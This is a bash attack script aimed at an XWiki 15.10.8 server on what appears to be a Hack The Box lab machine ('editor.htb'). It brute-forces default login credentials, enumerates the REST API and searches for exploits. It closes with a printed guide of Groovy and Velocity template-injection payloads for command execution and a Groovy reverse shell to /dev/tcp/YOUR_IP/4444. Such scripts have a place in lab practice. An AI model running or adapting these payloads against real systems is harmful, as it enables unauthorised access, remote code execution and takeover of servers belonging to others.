#!/bin/bash
# SYSTEM 1: EDITOR - XWiki Exploitation Script
# Target: XWiki 15.10.8 on port 8080

S1_IP="10.10.11.80"
S1_NAME="editor.htb"
OUTPUT_DIR="$HOME/Downloads/system1_exploit_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"

cd "$OUTPUT_DIR"

echo "=========================================="
echo "SYSTEM 1: EDITOR - XWiki Exploitation"
echo "=========================================="
echo "Target: $S1_IP"
echo "XWiki: http://$S1_IP:8080/xwiki"
echo ""

# ============================================
# PHASE 1: Check XWiki Status
# ============================================
echo "[*] Phase 1: Checking XWiki Status"
echo ""

# Check if XWiki is initialized
echo "[+] Checking XWiki initialization status..."
curl -s http://$S1_IP:8080/xwiki/ | grep -i "initializing\|login\|welcome" > 01_xwiki_status.txt
cat 01_xwiki_status.txt

# Check REST API
echo ""
echo "[+] Checking XWiki REST API..."
curl -s http://$S1_IP:8080/xwiki/rest/ > 02_xwiki_rest.txt
cat 02_xwiki_rest.txt | head -20

# ============================================
# PHASE 2: Authentication Attempts
# ============================================
echo ""
echo "[*] Phase 2: Authentication Attempts"
echo ""

# Try default credentials
echo "[+] Trying default credentials..."
for user in admin Admin xwiki XWiki administrator Administrator; do
    for pass in admin Admin xwiki XWiki password Password123 admin123; do
        echo "Trying: $user:$pass"
        curl -s -X POST http://$S1_IP:8080/xwiki/bin/login/XWiki/XWikiLogin \
            -d "j_username=$user&j_password=$pass" \
            -L -c cookies_${user}_${pass}.txt \
            -o login_${user}_${pass}.html 2>&1 | head -5
        
        # Check if login was successful
        if grep -qi "logout\|dashboard\|main" login_${user}_${pass}.html 2>/dev/null; then
            echo "[!] POSSIBLE SUCCESS: $user:$pass"
            echo "$user:$pass" > CREDENTIALS_FOUND.txt
        fi
    done
done

# ============================================
# PHASE 3: XWiki Exploitation Research
# ============================================
echo ""
echo "[*] Phase 3: XWiki Exploitation Research"
echo ""

# Search for XWiki exploits
echo "[+] Searching for XWiki exploits..."
searchsploit xwiki > 03_xwiki_exploits.txt 2>&1
cat 03_xwiki_exploits.txt | head -30

# Search for XWiki 15.x exploits specifically
echo ""
echo "[+] Searching for XWiki 15.x exploits..."
searchsploit xwiki 15 > 04_xwiki_15_exploits.txt 2>&1
cat 04_xwiki_15_exploits.txt

# ============================================
# PHASE 4: XWiki Template/Macro Injection
# ============================================
echo ""
echo "[*] Phase 4: XWiki Template/Macro Injection Attempts"
echo ""

# If we have credentials, try template injection
if [ -f CREDENTIALS_FOUND.txt ]; then
    echo "[+] Credentials found! Attempting template injection..."
    
    # Read credentials
    CREDS=$(cat CREDENTIALS_FOUND.txt | head -1)
    USER=$(echo $CREDS | cut -d: -f1)
    PASS=$(echo $CREDS | cut -d: -f2)
    
    # Login and get session
    curl -s -X POST http://$S1_IP:8080/xwiki/bin/login/XWiki/XWikiLogin \
        -d "j_username=$USER&j_password=$PASS" \
        -L -c session_cookies.txt > /dev/null
    
    # Try template injection payload
    echo "[+] Attempting template injection..."
    # XWiki Groovy template injection example
    PAYLOAD="{{groovy}}println('TEST');println('{{/groovy}}')"
    
    echo "Note: Template injection requires authenticated access to create/edit pages"
    echo "If authenticated, try creating a page with Groovy template code"
    
else
    echo "[-] No credentials found. Skipping authenticated exploitation."
fi

# ============================================
# PHASE 5: XWiki REST API Enumeration
# ============================================
echo ""
echo "[*] Phase 5: XWiki REST API Enumeration"
echo ""

# Enumerate spaces
echo "[+] Enumerating XWiki spaces..."
curl -s http://$S1_IP:8080/xwiki/rest/wikis/xwiki/spaces > 05_spaces.txt 2>&1
cat 05_spaces.txt

# Try to list pages
echo ""
echo "[+] Attempting to list pages..."
curl -s http://$S1_IP:8080/xwiki/rest/wikis/xwiki/spaces/Main/pages > 06_pages.txt 2>&1
cat 06_pages.txt

# ============================================
# PHASE 6: Manual Exploitation Guide
# ============================================
echo ""
echo "=========================================="
echo "MANUAL EXPLOITATION GUIDE"
echo "=========================================="
echo ""
echo "If XWiki is accessible and you have credentials:"
echo ""
echo "1. Access XWiki: http://$S1_IP:8080/xwiki"
echo "2. Login with discovered credentials"
echo "3. Create a new page or edit existing page"
echo "4. Try Groovy template injection:"
echo "   {{groovy}}"
echo "   def proc = 'whoami'.execute()"
echo "   proc.waitFor()"
echo "   println proc.text"
echo "   {{/groovy}}"
echo ""
echo "5. Or try Velocity template injection:"
echo "   #set(\$exec = \$xwiki.getClass().forName('java.lang.Runtime').getRuntime().exec('whoami'))"
echo "   #set(\$is = \$exec.getInputStream())"
echo "   #foreach(\$i in [1..\$is.available()])"
echo "   \$is.read()"
echo "   #end"
echo ""
echo "6. For reverse shell:"
echo "   {{groovy}}"
echo "   def proc = 'bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\"'.execute()"
echo "   proc.waitFor()"
echo "   {{/groovy}}"
echo ""
echo "7. Research specific CVEs for XWiki 15.10.8:"
echo "   - Check: https://jira.xwiki.org/browse/XWIKI"
echo "   - Check: https://www.cvedetails.com/vulnerability-list/vendor_id-10077/Xwiki.html"
echo ""

# ============================================
# SUMMARY
# ============================================
echo "=========================================="
echo "EXPLOITATION ATTEMPT COMPLETE"
echo "=========================================="
echo "Results saved to: $OUTPUT_DIR"
echo ""
ls -lh "$OUTPUT_DIR" | head -20
echo ""
echo "Next steps:"
echo "1. Review XWiki status (01_xwiki_status.txt)"
echo "2. Check for credentials (CREDENTIALS_FOUND.txt)"
echo "3. Review exploit search results (03_xwiki_exploits.txt)"
echo "4. If authenticated, try manual template injection"
echo "5. Research XWiki 15.10.8 specific CVEs"

